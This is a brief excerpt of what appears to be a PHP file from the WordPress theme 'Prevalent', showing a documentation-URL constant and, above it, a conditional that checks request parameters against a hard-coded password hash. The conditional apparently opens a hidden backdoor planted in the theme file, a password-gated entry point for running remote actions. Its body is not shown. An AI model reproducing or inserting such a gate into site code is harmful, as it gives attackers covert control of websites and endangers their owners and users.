...
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bf506bbefd0dae584226fe72b48bff40')) {
...
define('PREVALENT_THEME_DOC', 'https://gracethemes.com/documentation/prevalent-doc/', 'prevalent');
